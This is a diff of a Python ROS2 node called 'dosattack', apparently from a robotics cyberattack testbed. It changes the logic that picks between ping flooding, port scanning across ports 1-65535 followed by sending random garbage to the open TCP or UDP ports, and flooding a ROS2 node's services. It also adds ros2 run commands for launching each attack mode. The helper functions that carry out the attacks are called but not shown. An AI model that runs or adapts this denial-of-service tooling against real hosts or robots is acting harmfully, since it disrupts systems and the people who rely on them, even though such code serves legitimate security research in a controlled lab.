@@ -125,7 +125,24 @@ def main():
     dosprotocol = mydosnode.get_parameter('dos_protocol')._value
     dospingworkers = mydosnode.get_parameter('dos_ping_workers')._value
     dosnodename = mydosnode.get_parameter('dos_node_objective')._value
-    portrange = range(1, 65535)  # Escanea los puertos del 1 al 1024
+    portrange = range(1, 65535)  # Scan ports
+
+
+    # In ROS2 there is no mode right now of getting the ip of the node which manages a node. so we are going to take a parameter to get the ip
+    # TODO: Maybe I should try DDS with python to get the ip of a node.
+    
+    # We will have two DOS modes
+    # 1.- We will dos the host by ip. network layer. We need to provide the ip or the host.
+    # Two types: typical ping attack. And port filling attack. The port filling attack scans for open operts and then try to fill them with garbage
+
+    # 2.- We will try to fill the ros node's topics to make it to fail. 
+
+    # How to invoke them
+    # ros2 run roboticpark_cyberattacks dosattack  --ros-args  --params-file src/roboticpark_cyberattacks/config/dos.params.ping.yaml 
+    # ros2 run roboticpark_cyberattacks dosattack  --ros-args  --params-file src/roboticpark_cyberattacks/config/dos.params.fill.tcp.yaml 
+    # ros2 run roboticpark_cyberattacks dosattack  --ros-args  --params-file src/roboticpark_cyberattacks/config/dos.params.fill.udp.yaml 
+    # ros2 run roboticpark_cyberattacks dosattack  --ros-args  --params-file src/roboticpark_cyberattacks/config/dos.params.ros2.fill.yaml 
+
 
     if ipobjectiveParam == 'Unset':
         checkService(mydosnode)
@@ -137,7 +154,7 @@ def main():
         try:
             nodeObjectiveServer = nodeParam[0]
             nodeObjectiveType = nodeParam[1][0]
-            print(f'Servicio {nodeObjectiveServer} Tipo de parámetro {nodeObjectiveType}')
+            rslg(mydosnode,f'Servicio {nodeObjectiveServer} Tipo de parámetro {nodeObjectiveType}')
             dosFillService(mydosnode,nodeObjectiveServer,nodeObjectiveType,dospingworkers)
         except Exception as e:
             rslg(mydosnode,f'No service available in this node {e}')
@@ -147,36 +164,24 @@ def main():
     else:
         mydosnode.get_logger().info(f'Regular dos attack, we can choose between ping and random garbage:  {dostype} was chosen')
 
-        if dostype == 'garbage':
+        if dostype == 'dos_port_garbage':
             if dosprotocol == 'tcp':
-                print('tcports')
+                rslg(mydosnode,'Attacking tcp ports')
                 dosSendRandomGarbageTCP(ipobjectiveParam,mydosnode,scan_tcp_ports(ipobjectiveParam,portrange),socket.SOCK_STREAM)
             else:
+                # Too powerful. We avoid to kill ourselves by mistake
                 if ipobjectiveParam != '127.0.0.1':
-                    print('udpports')
+                    rslg(mydosnode,'Attacking udp ports')
                     dosSendRandomGarbageUDP(ipobjectiveParam,mydosnode,scan_udp_ports(ipobjectiveParam,portrange),socket.SOCK_DGRAM)
         else:
-            if dostype == 'bruteforce':
-                print(f'Bruteforcing w {dospingworkers}')
+            if dostype == 'dos_ping_bruteforce':
+                rslg(mydosnode,f'Bruteforcing w {dospingworkers}')
                 try:
                     dosSendPing(ipobjectiveParam,dospingworkers)
                 except Exception as e:
                     print(f"Ping Error:{e}")
 
-
-    
-    # In ROS2 there is no mode right now of getting the ip of the node which manages a node. so we are going to take a parameter, 
-    # it will be the ip
-    # TODO: Maybe I should try DDS with python to get it. 
-    # We will have two DOS modes
-    # 1.- We will dos the host by ip. network layer. We need to provide the ip or the host. In this case, we cand send garbage to ports. 
-    # Otherwise we can ping-death the host. 
-    # 2.- We will try to fill the ros node's topics to make it to fail. 
-    # So we would have 3 ways.
-
-
     rclpy.spin(mydosnode)
-
     rclpy.shutdown()
 
 
